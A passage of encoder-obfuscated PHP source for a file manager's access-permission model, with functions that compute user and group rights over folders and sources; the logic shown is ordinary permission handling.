$this->addAll($ÀÚœ´ğø); return !0; } public function authClear($ëá¶×–Ç) { $ú‘šª =& $_SERVER[Å¶¨Şêº]; $Ú÷ƒù•  = Model($ú‘šª[1337])->sourceInfo($ëá¶×–Ç); $É…š¤ï© = array($ëá¶×–Ç); if ($Ú÷ƒù• [$ú‘šª[419]] == $ú‘šª[99]) { $âÈ€ˆğ¡ = array($ú‘šª[589] => array($ú‘šª[549], $Ú÷ƒù• [$ú‘šª[520]] . $ëá¶×–Ç . $ú‘šª[550])); $É…š¤ï© = Model($ú‘šª[1337])->field($ú‘šª[426])->where($âÈ€ˆğ¡)->getField($ú‘šª[411], !0); $É…š¤ï©[] = $ëá¶×–Ç; } $this->where(array($ú‘šª[426] => array($ú‘šª[427], $É…š¤ï©)))->delete(); return !0; } public function getAllChildren($ÒÓíıâ‰) { $ŞîşÑÀÃ =& $_SERVER[Å¶¨Şêº]; $·½­­± = Model($ŞîşÑÀÃ[1337])->sourceInfo($ÒÓíıâ‰); if ($·½­­±[$ŞîşÑÀÃ[419]] != $ŞîşÑÀÃ[99]) { return $this->sourceListAuth(array($ÒÓíıâ‰)); } if ($·½­­±[$ŞîşÑÀÃ[420]] != SourceModel::TYPE_GROUP) { return array(); } $ö­ôµ‹ = 1; $‚­ú‹æ = array($ÒÓíıâ‰); if ($·½­­±[$ŞîşÑÀÃ[441]] == $ŞîşÑÀÃ[209] && $·½­­±[$ŞîşÑÀÃ[505]] != $ö­ôµ‹) { $‚­ú‹æ = $this->groupChidldAllRootSource($·½­­±[$ŞîşÑÀÃ[505]]); } $±¬âóšƒ = $this->field($ŞîşÑÀÃ[411])->group($ŞîşÑÀÃ[411])->select(); $±¬âóšƒ = array_to_keyvalue($±¬âóšƒ, $ŞîşÑÀÃ[12], $ŞîşÑÀÃ[411]); if (!$±¬âóšƒ) { return array(); } $—©ù“Î“ = $ŞîşÑÀÃ[2035]; $ÑÅºØ™ = array($ŞîşÑÀÃ[411] => array($ŞîşÑÀÃ[7], $±¬âóšƒ), $ŞîşÑÀÃ[440] => $ŞîşÑÀÃ[209]); $çÎÇú ƒ = Model($ŞîşÑÀÃ[823])->field($—©ù“Î“)->where($ÑÅºØ™)->select(); $²Ğ²ºÜõ = array($ÒÓíıâ‰); foreach ($çÎÇú ƒ as $à¾ÚˆÛ‚) { foreach ($‚­ú‹æ as $™­¬åÎş) { $ö¥ĞâÃ = $ŞîşÑÀÃ[60] . $™­¬åÎş . $ŞîşÑÀÃ[60]; $¢Ì¯á© = $à¾ÚˆÛ‚[$ŞîşÑÀÃ[520]] . $à¾ÚˆÛ‚[$ŞîşÑÀÃ[411]] . $ŞîşÑÀÃ[60]; if (strstr($¢Ì¯á©, $ö¥ĞâÃ)) { $²Ğ²ºÜõ[] = $à¾ÚˆÛ‚[$ŞîşÑÀÃ[411]]; break; } } } return $this->sourceListAuth($²Ğ²ºÜõ); } private function sourceListAuth($ª¥Àœ´) { $åå¿¨“Í =& $_SERVER[Å¶¨Şêº]; $ğÜ¹ëÌ¸ = Model($åå¿¨“Í[1337])->sourceListInfo($ª¥Àœ´, !0); $ æÖı©³ = $this->sourceAuthSelect($ª¥Àœ´); $Ü¯’×ğß = array(); $ï×…©Ÿ = array(); foreach ($ğÜ¹ëÌ¸ as $ûà¯ëÖ¬) { unset($ûà¯ëÖ¬[$åå¿¨“Í[465]]); unset($ûà¯ëÖ¬[$åå¿¨“Í[463]]); unset($ûà¯ëÖ¬[$åå¿¨“Í[422]]); unset($ûà¯ëÖ¬[$åå¿¨“Í[98]]); $ëÂ¼®õ = $ æÖı©³[$ûà¯ëÖ¬[$åå¿¨“Í[411]]]; if (!$ëÂ¼®õ) { continue; } $ûà¯ëÖ¬[$åå¿¨“Í[2036]] = $this->authTargetInfo($ëÂ¼®õ); $ûà¯ëÖ¬[$åå¿¨“Í[518]] = rtrim($ûà¯ëÖ¬[$åå¿¨“Í[524]], $åå¿¨“Í[8]) . $åå¿¨“Í[8] . ltrim($ûà¯ëÖ¬[$åå¿¨“Í[518]], $åå¿¨“Í[8]); $Ü¯’×ğß[] = $ûà¯ëÖ¬; $ÏÏü–ë• = count(explode($åå¿¨“Í[8], trim($ûà¯ëÖ¬[$åå¿¨“Í[518]], $åå¿¨“Í[8]))); $ï×…©Ÿ[] = $ÏÏü–ë• + ($ûà¯ëÖ¬[$åå¿¨“Í[43]] == $åå¿¨“Í[86] ? 0 : 1000); } array_multisort($ï×…©Ÿ, SORT_ASC, $Ü¯’×ğß); return $Ü¯’×ğß; } private function groupChidldAllRootSource($Ì¤Áõ·È) { $ï‡Ô°‘ì =& $_SERVER[Å¶¨Şêº]; $İµÃ‘ûó = Model($ï‡Ô°‘ì[2037])->groupChildrenAll($Ì¤Áõ·È); $•©–õü = array($ï‡Ô°‘ì[441] => 0, $ï‡Ô°‘ì[505] => array($ï‡Ô°‘ì[7], $İµÃ‘ûó), $ï‡Ô°‘ì[420] => SourceModel::TYPE_GROUP); $£şä¯±á = Model($ï‡Ô°‘ì[823])->field($ï‡Ô°‘ì[411])->where($•©–õü)->select(); $£şä¯±á = array_to_keyvalue($£şä¯±á, $ï‡Ô°‘ì[12], $ï‡Ô°‘ì[411]); return $£şä¯±á; } private function authTargetInfo($ëˆí±£) { $ïâş–ä =& $_SERVER[Å¶¨Şêº]; $‘şÏ¶¾° = array(); $Ü°Á¶¦÷ = array(); $µÛƒõ†å = 2 << 25; foreach ($ëˆí±£ as $¢á¦›÷ì) { $ä¥äíç = Model($ïâş–ä[507])->listData($¢á¦›÷ì[$ïâş–ä[1956]]); if (!$ä¥äíç) { continue; } if ($¢á¦›÷ì[$ïâş–ä[420]] == SourceModel::TYPE_USER) { $Éú¸Æ¨Á = Model($ïâş–ä[513])->getInfoSimpleOuter($¢á¦›÷ì[$ïâş–ä[505]]); if ($Éú¸Æ¨Á[$ïâş–ä[1663]] == $ïâş–ä[1186]) { continue; } if ($Éú¸Æ¨Á[$ïâş–ä[1663]] == $ïâş–ä[209]) { $Éú¸Æ¨Á[$ïâş–ä[42]] = LNG($ïâş–ä[2038]); } } else { $Éú¸Æ¨Á = Model($ïâş–ä[521])->getInfoSimple($¢á¦›÷ì[$ïâş–ä[505]]); } if (!$Éú¸Æ¨Á) { continue; } $Éú¸Æ¨Á[$ïâş–ä[476]] = $ä¥äíç; $‘şÏ¶¾°[] = $Éú¸Æ¨Á; $ÆŞ·ÔÅ¶ = 0; if ($¢á¦›÷ì[$ïâş–ä[420]] == SourceModel::TYPE_GROUP) { $ÆŞ·ÔÅ¶ = $µÛƒõ†å * 2; } if ($¢á¦›÷ì[$ïâş–ä[420]] == SourceModel::TYPE_USER) { $ÆŞ·ÔÅ¶ = $µÛƒõ†å; } if ($¢á¦›÷ì[$ïâş–ä[420]] == SourceModel::TYPE_USER && $¢á¦›÷ì[$ïâş–ä[505]] == $ïâş–ä[209]) { $ÆŞ·ÔÅ¶ = 0; } $Ü°Á¶¦÷[] = $ä¥äíç[$ïâş–ä[422]] + $ÆŞ·ÔÅ¶; } array_multisort($Ü°Á¶¦÷, SORT_DESC, $‘şÏ¶¾°); return $‘şÏ¶¾°; } public function getAllChildrenByUser($ÏĞÚ©—Ç, $äÑ¯º•—) { $åÓÅ’«ä =& $_SERVER[Å¶¨Şêº]; $üãÔ×ÛŸ = Model($åÓÅ’«ä[534])->getInfo($äÑ¯º•—); if (!$äÑ¯º•— || !$ÏĞÚ©—Ç || !$üãÔ×ÛŸ) { return array(); } $éö£­ÙÏ = Model($åÓÅ’«ä[1337])->sourceInfo($ÏĞÚ©—Ç); $­®¤‹ïÙ = array(); $Àùù† = 1; if ($éö£­ÙÏ[$åÓÅ’«ä[441]] == $åÓÅ’«ä[209] && $éö£­ÙÏ[$åÓÅ’«ä[505]] != $Àùù† && $this->groupContainUser($éö£­ÙÏ[$åÓÅ’«ä[505]], $äÑ¯º•—)) { foreach ($üãÔ×ÛŸ[$åÓÅ’«ä[2039]] as $Øæ„‹ë€) { $§¼ª—Å¡ = Model($åÓÅ’«ä[521])->getInfo($Øæ„‹ë€[$åÓÅ’«ä[1852]]); $èæâ«´à = Model($åÓÅ’«ä[534])->getInfoSimpleOuter($äÑ¯º•—); $èæâ«´à[$åÓÅ’«ä[476]] = $Øæ„‹ë€[$åÓÅ’«ä[422]]; if (Model($åÓÅ’«ä[507])->authCheckAction($Øæ„‹ë€[$åÓÅ’«ä[422]][$åÓÅ’«ä[422]], $åÓÅ’«ä[1873])) { continue; } $Î¬áŒ±¦ = array($åÓÅ’«ä[42] => $åÓÅ’«ä[1206] . $§¼ª—Å¡[$åÓÅ’«ä[42]], $åÓÅ’«ä[411] => $§¼ª—Å¡[$åÓÅ’«ä[98]][$åÓÅ’«ä[411]], $åÓÅ’«ä[95] => KodIO::make($§¼ª—Å¡[$åÓÅ’«ä[98]][$åÓÅ’«ä[411]]), $åÓÅ’«ä[441] => $åÓÅ’«ä[209], $åÓÅ’«ä[420] => $åÓÅ’«ä[514], $åÓÅ’«ä[43] => $åÓÅ’«ä[553], $åÓÅ’«ä[518] => $§¼ª—Å¡[$åÓÅ’«ä[525]], $åÓÅ’«ä[1852] => $§¼ª—Å¡[$åÓÅ’«ä[1852]], $åÓÅ’«ä[522] => $§¼ª—Å¡[$åÓÅ’«ä[441]], $åÓÅ’«ä[2036] => array($èæâ«´à)); $­®¤‹ïÙ[$Î¬áŒ±¦[$åÓÅ’«ä[411]]] = $Î¬áŒ±¦; } } $¤Â›¡ = array(); $÷ÏÜ«ñ´ = $this->getAllChildren($ÏĞÚ©—Ç); foreach ($÷ÏÜ«ñ´ as $™Ç‘Ó¨´) { $¬àìÙ– = !1; foreach ($™Ç‘Ó¨´[$åÓÅ’«ä[2036]] as $Úù¬ÅÖ…) { if ($Úù¬ÅÖ…[$åÓÅ’«ä[1663]]) { if ($Úù¬ÅÖ…[$åÓÅ’«ä[1663]] == $äÑ¯º•—) { $¬àìÙ– = !0; break; } } if ($Úù¬ÅÖ…[$åÓÅ’«ä[1852]]) { if ($this->groupContainUser($Úù¬ÅÖ…[$åÓÅ’«ä[1852]], $äÑ¯º•—)) { $¬àìÙ– = !0; break; } } } if ($¬àìÙ–) { $¤Â›¡[] = $™Ç‘Ó¨´; } $şœ…­ğ = $™Ç‘Ó¨´[$åÓÅ’«ä[411]]; if (isset($­®¤‹ïÙ[$şœ…­ğ])) { $™Ç‘Ó¨´[$åÓÅ’«ä[2036]][] = $­®¤‹ïÙ[$şœ…­ğ][0]; $­®¤‹ïÙ[$şœ…­ğ] = !1; } } $­®¤‹ïÙ = array_filter(array_values($­®¤‹ïÙ)); $¤Â›¡ = array_merge($­®¤‹ïÙ, $¤Â›¡); return $¤Â›¡; } public function setAllChildrenByUser($âóÊ¯Î€, $õĞ™ø», $ûêÙÖ½®) { $Š¾ûˆ˜ı =& $_SERVER[Å¶¨Şêº]; $™³àÜëÚ = $this->getAllChildrenByUser($âóÊ¯Î€, $õĞ™ø»); if (!$ûêÙÖ½® || !$™³àÜëÚ) { return !1; } foreach ($™³àÜëÚ as $¦¿˜“Ø) { $ùìú†Àê = array(); foreach ($¦¿˜“Ø[$Š¾ûˆ˜ı[2036]] as $Ã‹Œ÷†ö) { $İƒë¨•± = $Ã‹Œ÷†ö[$Š¾ûˆ˜ı[476]]; $¬›¶¼”© = $Ã‹Œ÷†ö[$Š¾ûˆ˜ı[1663]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $áÈ•¨Ï‘ = $Ã‹Œ÷†ö[$Š¾ûˆ˜ı[1663]] ? $Ã‹Œ÷†ö[$Š¾ûˆ˜ı[1663]] : $Ã‹Œ÷†ö[$Š¾ûˆ˜ı[1852]]; if ($Ã‹Œ÷†ö[$Š¾ûˆ˜ı[1663]] && $Ã‹Œ÷†ö[$Š¾ûˆ˜ı[1663]] == $õĞ™ø») { continue; } $ùìú†Àê[] = array($Š¾ûˆ˜ı[411] => $¦¿˜“Ø[$Š¾ûˆ˜ı[411]], $Š¾ûˆ˜ı[420] => $¬›¶¼”©, $Š¾ûˆ˜ı[505] => intval($áÈ•¨Ï‘), $Š¾ûˆ˜ı[1956] => isset($İƒë¨•±[$Š¾ûˆ˜ı[408]]) ? intval($İƒë¨•±[$Š¾ûˆ˜ı[408]]) : 0, $Š¾ûˆ˜ı[2016] => isset($İƒë¨•±[$Š¾ûˆ˜ı[2016]]) ? intval($İƒë¨•±[$Š¾ûˆ˜ı[2016]]) : -1); } $ùìú†Àê[] = array($Š¾ûˆ˜ı[411] => $¦¿˜“Ø[$Š¾ûˆ˜ı[411]], $Š¾ûˆ˜ı[420] => SourceModel::TYPE_USER, $Š¾ûˆ˜ı[505] => intval($õĞ™ø»), $Š¾ûˆ˜ı[1956] => intval($ûêÙÖ½®), $Š¾ûˆ˜ı[2016] => -1); $this->where(array($Š¾ûˆ˜ı[426] => $¦¿˜“Ø[$Š¾ûˆ˜ı[411]]))->delete(); $this->addAll($ùìú†Àê); } return !0; } public function get($¶ÌìÓÁœ) { $ƒ¶Ğ²¥ø = $this->getSourceList(array($¶ÌìÓÁœ), !0); return $ƒ¶Ğ²¥ø[0]; } public function getSourceList($³ÇÙüƒö, $Ñş•®ï• = false, $Ù«Ö•ÃË = false) { $á•“Ê‰ =& $_SERVER[Å¶¨Şêº]; if (!$³ÇÙüƒö) { return array(); } $·…ä‘š¿ = Model($á•“Ê‰[1337]); if (!$Ñş•®ï• && count($³ÇÙüƒö) == 1) { $Ñş•®ï• = array(); $Ñş•®ï•[$³ÇÙüƒö[0]] = $·…ä‘š¿->sourceInfo($³ÇÙüƒö[0]); } if (!$Ñş•®ï•) { $ã¬¨Ç“ã = array($á•“Ê‰[426] => array($á•“Ê‰[427], $³ÇÙüƒö)); $Ñş•®ï• = $·…ä‘š¿->field($á•“Ê‰[2040])->where($ã¬¨Ç“ã)->select(); $Ñş•®ï• = array_to_keyvalue($Ñş•®ï•, $á•“Ê‰[411]); } $‰É™¦Ñ® = $³ÇÙüƒö; foreach ($Ñş•®ï• as $ãõËê¿­ => $Ë£©£™Õ) { $ŞÇ––ñ¾ = $·…ä‘š¿->parentLevelArray($Ë£©£™Õ[$á•“Ê‰[520]]); $‰É™¦Ñ® = array_merge($‰É™¦Ñ®, array($ãõËê¿­), array_reverse($ŞÇ––ñ¾)); } $‰É™¦Ñ® = array_values(array_unique($‰É™¦Ñ®)); if (!$‰É™¦Ñ®) { return array(); } $èÂÊ’ş£ = $this->sourceAuthSelect($‰É™¦Ñ®); $÷µ¿Ò® = array(); foreach ($‰É™¦Ñ® as $åÛı¤´„) { if (isset($èÂÊ’ş£[$åÛı¤´„])) { $÷µ¿Ò®[$åÛı¤´„] = $èÂÊ’ş£[$åÛı¤´„]; } } $ûç”ï¿ª = $this->userIsRoot($Ù«Ö•ÃË); $Õö±ò½° = AuthModel::authAll(); $üúñÖãç = array($á•“Ê‰[423] => $Õö±ò½°, $á•“Ê‰[2041] => array($á•“Ê‰[428] => 0, $á•“Ê‰[1858] => $Õö±ò½°, $á•“Ê‰[429] => LNG($á•“Ê‰[2042]), $á•“Ê‰[1875] => $á•“Ê‰[2043])); $ï¹Åè‰» = array(); foreach ($Ñş•®ï• as $åÛı¤´„ => $¦§„Ô¤¿) { if ($ûç”ï¿ª && $GLOBALS[$á•“Ê‰[6]][$á•“Ê‰[1871]]) { $ï¹Åè‰»[$åÛı¤´„] = $üúñÖãç; continue; } $ï¹Åè‰»[$åÛı¤´„] = $this->makeSourceAuth($¦§„Ô¤¿, $÷µ¿Ò®, $Ù«Ö•ÃË); } return $ï¹Åè‰»; } public function authDeepCheck($µÂá”–°, $åíßË£æ = false) { $ï®¼¸ö =& $_SERVER[Å¶¨Şêº]; $åíßË£æ = $åíßË£æ ? $åíßË£æ : USER_ID; $å™¡í°¯ = $this->makeAuthDeep($åíßË£æ); if (!in_array($µÂá”–°, $å™¡í°¯[$ï®¼¸ö[2044]])) { return !1; } $Ó£‹¶‹İ = array(); foreach ($å™¡í°¯[$ï®¼¸ö[2045]] as $üËÂû… => $ß¹áŒë) { if (!in_array($µÂá”–°, $ß¹áŒë)) { continue; } $Ó£‹¶‹İ[] = $üËÂû…; } if (!$Ó£‹¶‹İ) { return !1; } $öè·î·Ÿ = $Ó£‹¶‹İ ? $Ó£‹¶‹İ[0] : $µÂá”–°; return array($ï®¼¸ö[423] => -1, $ï®¼¸ö[476] => array($ï®¼¸ö[428] => $ï®¼¸ö[1186], $ï®¼¸ö[1858] => $ï®¼¸ö[209], $ï®¼¸ö[429] => LNG($ï®¼¸ö[2046]), $ï®¼¸ö[1875] => $ï®¼¸ö[2047]), $ï®¼¸ö[2048] => LNG($ï®¼¸ö[2049]), $ï®¼¸ö[2050] => $this->sourceAuthInfo($öè·î·Ÿ)); } protected function makeAuthDeep($“òÓúáĞ = false) { $í‹ƒª´¦ =& $_SERVER[Å¶¨Şêº]; static $‘–ÅœÁ‹ = array(); $“òÓúáĞ = $“òÓúáĞ ? $“òÓúáĞ : USER_ID; if (isset($‘–ÅœÁ‹[$“òÓúáĞ])) { return $‘–ÅœÁ‹[$“òÓúáĞ]; } $¤”ŒîÂ‘ = Model($í‹ƒª´¦[2051])->listData(); $Îè…İÎë = array(); foreach ($¤”ŒîÂ‘ as $šˆÊ¡ä) { if ($šˆÊ¡ä[$í‹ƒª´¦[422]] == 0 && $šˆÊ¡ä[$í‹ƒª´¦[1874]] == $í‹ƒª´¦[99]) { $Îè…İÎë[] = $šˆÊ¡ä[$í‹ƒª´¦[408]]; } } $ Şşè = $this->userGroupParents($“òÓúáĞ); $òÔš­ú– = array($í‹ƒª´¦[420] => SourceModel::TYPE_USER, $í‹ƒª´¦[505] => $“òÓúáĞ); if ($ Şşè) { $òÔš­ú– = array(array($í‹ƒª´¦[420] => SourceModel::TYPE_USER, $í‹ƒª´¦[505] => $“òÓúáĞ), array($í‹ƒª´¦[420] => SourceModel::TYPE_GROUP, $í‹ƒª´¦[505] => array($í‹ƒª´¦[427], $ Şşè)), $í‹ƒª´¦[997] => $í‹ƒª´¦[1950]); } $¾¨Îè€ş = $this->field($í‹ƒª´¦[2052])->where($òÔš­ú–)->select(); $» ‰ÙáŸ = array(); $çÓ·éíá = array_to_keyvalue_group($¾¨Îè€ş, $í‹ƒª´¦[411]); foreach ($çÓ·éíá as $Ì¤©åš => $Â³ëÅ¦) { $…ˆÎèºú = $this->authArrayCheck($Â³ëÅ¦, $“òÓúáĞ); if ($…ˆÎèºú[$í‹ƒª´¦[423]] > 0) { $» ‰ÙáŸ[] = $Ì¤©åš . $í‹ƒª´¦[12]; } } if ($ Şşè) { $ª…¯íÍ = Model($í‹ƒª´¦[521]); foreach ($ Şşè as $ÈŸÜ†Î®) { $±ÍÕÑÆ‚ = $ª…¯íÍ->getInfo($ÈŸÜ†Î®); if (!$±ÍÕÑÆ‚ || !is_array($±ÍÕÑÆ‚[$í‹ƒª´¦[98]])) { continue; } $» ‰ÙáŸ[] = $±ÍÕÑÆ‚[$í‹ƒª´¦[98]][$í‹ƒª´¦[411]]; } } $ßî©«¯³ = array(); $³İš¿” = $ Şşè; $¦ıô®àĞ = Model($í‹ƒª´¦[1337]); $ª…¯íÍ = Model($í‹ƒª´¦[521]); $òˆ†ª¸õ = array(); $á¯É¸§Ö = array(); $ä‘¹ÅºÚ = array(); $Ü€àòîĞ = array(); if ($» ‰ÙáŸ) { $æÒêó¸Ç = $¦ıô®àĞ->where(array($í‹ƒª´¦[411] => array($í‹ƒª´¦[427], $» ‰ÙáŸ)))->select(); foreach ($æÒêó¸Ç as $­çóİ) { $›Üõ¹ = $¦ıô®àĞ->parentLevelArray($­çóİ[$í‹ƒª´¦[520]]); $ßî©«¯³ = array_merge($ßî©«¯³, $›Üõ¹); $³İš¿”[] = $­çóİ[$í‹ƒª´¦[505]]; $òˆ†ª¸õ[$­çóİ[$í‹ƒª´¦[411]]] = $›Üõ¹; $á¯É¸§Ö[$­çóİ[$í‹ƒª´¦[411]]] = $­çóİ[$í‹ƒª´¦[505]]; } } $³İš¿” = array_values(array_unique($³İš¿”)); $ŠÅ¾Ï = $³İš¿”; foreach ($ŠÅ¾Ï as $ÈŸÜ†Î®) { $±ÍÕÑÆ‚ = $ª…¯íÍ->getInfo($ÈŸÜ†Î®); $›Üõ¹ = $¦ıô®àĞ->parentLevelArray($±ÍÕÑÆ‚[$í‹ƒª´¦[520]]); $³İš¿” = array_merge($³İš¿”, $›Üõ¹); } $³İš¿” = array_values(array_unique($³İš¿”)); foreach ($³İš¿” as $ÈŸÜ†Î®) { $±ÍÕÑÆ‚ = $ª…¯íÍ->getInfo($ÈŸÜ†Î®); $ßî©«¯³[] = $±ÍÕÑÆ‚[$í‹ƒª´¦[98]][$í‹ƒª´¦[411]]; $ä‘¹ÅºÚ[$ÈŸÜ†Î®] = $±ÍÕÑÆ‚[$í‹ƒª´¦[98]][$í‹ƒª´¦[411]]; $Ü€àòîĞ[$ÈŸÜ†Î®] = $¦ıô®àĞ->parentLevelArray($±ÍÕÑÆ‚[$í‹ƒª´¦[520]]); } foreach ($òˆ†ª¸õ as $±ö÷®¥À => $û°é¯üÕ) { $—Æ¢ªË¾ = $á¯É¸§Ö[$±ö÷®¥À]; if (!$—Æ¢ªË¾ || !$ä‘¹ÅºÚ[$—Æ¢ªË¾]) { continue; } $Óø­¬¬¼ = array(); foreach ($Ü€àòîĞ[$—Æ¢ªË¾] as $ÈŸÜ†Î®) { $Óø­¬¬¼[] = $ä‘¹ÅºÚ[$ÈŸÜ†Î®]; } $òˆ†ª¸õ[$±ö÷®¥À] = array_merge($Óø­¬¬¼, $û°é¯üÕ); } $ßî©«¯³ = array_values(array_unique($ßî©«¯³)); $èã„¥ç = array($í‹ƒª´¦[2044] => $ßî©«¯³, $í‹ƒª´¦[2045] => $òˆ†ª¸õ); $‘–ÅœÁ‹[$“òÓúáĞ] = $èã„¥ç; return $èã„¥ç; } private function makeSourceAuth($İëªöÖ¿, $£»ò‡, $à€¤«ç = false) { $úÑßè =& $_SERVER[Å¶¨Şêº]; $õé‘Æİã = $úÑßè[99]; $½‹–àÔ‘ = $İëªöÖ¿[$úÑßè[505]]; $û‚ìû¿ = $İëªöÖ¿[$úÑßè[420]] == SourceModel::TYPE_GROUP; $Õ«ŸáÍã = $û‚ìû¿ ? $this->groupRootAuth($½‹–àÔ‘, $à€¤«ç) : !1; if ($Õ«ŸáÍã && Model($úÑßè[507])->authCheckAction($Õ«ŸáÍã[$úÑßè[422]], $úÑßè[1873])) { return $this->groupAuthInfo($Õ«ŸáÍã, $½‹–àÔ‘); } $´üÔ™¶š = Model($úÑßè[1337])->parentLevelArray($İëªöÖ¿[$úÑßè[520]]); $´üÔ™¶š = array_merge(array($İëªöÖ¿[$úÑßè[411]]), array_reverse($´üÔ™¶š)); $‚ƒÃƒ² = !1; foreach ($´üÔ™¶š as $êıêğ‹ö) { if (!isset($£»ò‡[$êıêğ‹ö])) { continue; } $ŠöŒŞ¶ò = $this->authMake($£»ò‡[$êıêğ‹ö], $à€¤«ç); if ($ŠöŒŞ¶ò[$úÑßè[476]]) { $‚ƒÃƒ² = $ŠöŒŞ¶ò; break; } } if (!$û‚ìû¿) { return $‚ƒÃƒ²; } if (!$‚ƒÃƒ² && $Õ«ŸáÍã) { $‚ƒÃƒ² = $this->groupAuthInfo($Õ«ŸáÍã, $½‹–àÔ‘); } if (!$‚ƒÃƒ²) { $Åãáªú = Model($úÑßè[521])->getInfo($½‹–àÔ‘); $Ç—±çÅ¾ = explode($úÑßè[60], trim($Åãáªú[$úÑßè[520]], $úÑßè[60])); $Ç—±çÅ¾ = array_reverse($Ç—±çÅ¾); foreach ($Ç—±çÅ¾ as $ÂîõœÈÀ) { if ($ÂîõœÈÀ == $úÑßè[209] || $ÂîõœÈÀ == $õé‘Æİã) { continue; } $ØğĞ÷ÕŸ = $this->groupRootAuth($ÂîõœÈÀ, $à€¤«ç); if (!$ØğĞ÷ÕŸ) { continue; } $‚ƒÃƒ² = $this->groupAuthInfo($ØğĞ÷ÕŸ, $ÂîõœÈÀ); break; } } if (!$‚ƒÃƒ² || $‚ƒÃƒ²[$úÑßè[423]] <= 0) { $¬ÛŞà = $this->authDeepCheck($İëªöÖ¿[$úÑßè[411]], $à€¤«ç); if ($¬ÛŞà) { $‚ƒÃƒ² = $¬ÛŞà; } } return $‚ƒÃƒ²; } private function userIsRoot($¶·çïº = false) { $³¤ÏÊŒ– =& $_SERVER[Å¶¨Şêº]; if (!$¶·çïº && _get($GLOBALS, $³¤ÏÊŒ–[503])) { return !0; } $¬ æÔŠ = Model($³¤ÏÊŒ–[534])->getInfo($¶·çïº); $¶ÎÃ”Ëø = Model($³¤ÏÊŒ–[2053])->listData($¬ æÔŠ[$³¤ÏÊŒ–[1544]]); if ($¶ÎÃ”Ëø && $¶ÎÃ”Ëø[$³¤ÏÊŒ–[511]][$³¤ÏÊŒ–[2054]] == 1) { return !0; } return !1; } private function sourceAuthInfo($Îôå¿àÙ) { $ãœïÚî¬ =& $_SERVER[Å¶¨Şêº]; $±³²ù³ş = Model($ãœïÚî¬[1337]); $ŸÙµµ¨¿ = $±³²ù³ş->sourceInfo($Îôå¿àÙ); if (!$ŸÙµµ¨¿) { return !1; } $±³²ù³ş->groupPathDisplay($ŸÙµµ¨¿); $‹±«Æ²â = array($ŸÙµµ¨¿); $‹±«Æ²â = $±³²ù³ş->_listAppendPath($‹±«Æ²â); $ŸÙµµ¨¿ = $‹±«Æ²â[0]; $ˆÓ¼ôá€ = $ŸÙµµ¨¿[$ãœïÚî¬[518]]; if (isset($ŸÙµµ¨¿[$ãœïÚî¬[526]])) { $É„Íö¡µ = explode($ãœïÚî¬[8], trim($ŸÙµµ¨¿[$ãœïÚî¬[518]], $ãœïÚî¬[8])); array_shift($É„Íö¡µ); $ˆÓ¼ôá€ = $ŸÙµµ¨¿[$ãœïÚî¬[524]] . $ãœïÚî¬[2055] . implode($ãœïÚî¬[8], $É„Íö¡µ); } return array($ãœïÚî¬[429] => $ŸÙµµ¨¿[$ãœïÚî¬[42]], $ãœïÚî¬[95] => KodIO::make($ŸÙµµ¨¿[$ãœïÚî¬[411]]), $ãœïÚî¬[2056] => $ˆÓ¼ôá€); } private function groupAuthInfo($ñ‹¸’šÔ, $°°Ğ„…Ù) { $îÔÓÏÏ£ =& $_SERVER[Å¶¨Şêº]; $÷ıà£à = Model($îÔÓÏÏ£[521])->getInfo($°°Ğ„…Ù); return array($îÔÓÏÏ£[2057] => intval($ñ‹¸’šÔ[$îÔÓÏÏ£[422]]), $îÔÓÏÏ£[2041] => $ñ‹¸’šÔ, $îÔÓÏÏ£[2058] => LNG($îÔÓÏÏ£[2059]), $îÔÓÏÏ£[2050] => array($îÔÓÏÏ£[429] => $÷ıà£à[$îÔÓÏÏ£[42]], $îÔÓÏÏ£[95] => KodIO::make($÷ıà£à[$îÔÓÏÏ£[98]][$îÔÓÏÏ£[411]]), $îÔÓÏÏ£[2056] => $÷ıà£à[$îÔÓÏÏ£[525]])); } protected function groupRootAuth($¤¿ıÆ­§, $ Æò°„  = false) { $•Ò·Ö®¹ =& $_SERVER[Å¶¨Şêº]; $ Æò°„  = $ Æò°„  ? $ Æò°„  : USER_ID; $üèĞÜÏõ = $ Æò°„  . $•Ò·Ö®¹[2060] . $¤¿ıÆ­§; static $«™Âöåş = array(); if (isset($«™Âöåş[$üèĞÜÏõ])) { return $«™Âöåş[$üèĞÜÏõ]; } $ß»æŸ¤Æ = Model($•Ò·Ö®¹[521])->getInfo($¤¿ıÆ­§); $¢€óàõ¥ = $this->userGroupList($ Æò°„ ); $îª·èï = isset($¢€óàõ¥[$¤¿ıÆ­§]) ? $¢€óàõ¥[$¤¿ıÆ­§][$•Ò·Ö®¹[422]] : !1; if ($îª·èï && Model($•Ò·Ö®¹[507])->authCheckAction($îª·èï[$•Ò·Ö®¹[422]], $•Ò·Ö®¹[1873])) { $«™Âöåş[$üèĞÜÏõ] = $îª·èï; return $îª·èï; } $Øåá²µ = $this->sourceAuthSelect($ß»æŸ¤Æ[$•Ò·Ö®¹[98]][$•Ò·Ö®¹[411]]); $†‘Ì•º³ = $Øåá²µ ? $this->authMake($Øåá²µ, $ Æò°„ ) : !1; $¤×¢¿çÀ = $†‘Ì•º³ ? $†‘Ì•º³[$•Ò·Ö®¹[476]] : !1; $«™Âöåş[$üèĞÜÏõ] = $¤×¢¿çÀ ? $¤×¢¿çÀ : $îª·èï; return $«™Âöåş[$üèĞÜÏõ]; } public function authOwnerApply($òÎ¾À³) { $”áÃàšŠ =& $_SERVER[Å¶¨Şêº]; if (empty($òÎ¾À³[$”áÃàšŠ[422]]) || isset($òÎ¾À³[$”áÃàšŠ[2061]]) && $òÎ¾À³[$”áÃàšŠ[2061]]) { return $òÎ¾À³; } if (AuthModel::authCheckRoot($òÎ¾À³[$”áÃàšŠ[422]][$”áÃàšŠ[423]])) { return $òÎ¾À³; } $ş«ê§ = Model($”áÃàšŠ[1337])->parentLevelArray($òÎ¾À³[$”áÃàšŠ[520]]); $ş«ê§ = array_merge(array($òÎ¾À³[$”áÃàšŠ[411]]), array_reverse($ş«ê§)); $ŸÇæå÷µ = $this->sourceAuthSelect($ş«ê§); $®ß®ØÅ = array(); $şä¡¶ıÙ = array(); foreach ($ŸÇæå÷µ as $€ğ°Ë => $§ç©üœ‰) { $™â€ææÇ = $this->authFolderOwnerUser($§ç©üœ‰); $®ß®ØÅ[$€ğ°Ë] = $™â€ææÇ; $şä¡¶ıÙ = array_merge($şä¡¶ıÙ, $™â€ææÇ[$”áÃàšŠ[599]]); if ($™â€ææÇ[$”áÃàšŠ[2062]]) { break; } } if (count($şä¡¶ıÙ) == 0) { $şä¡¶ıÙ = 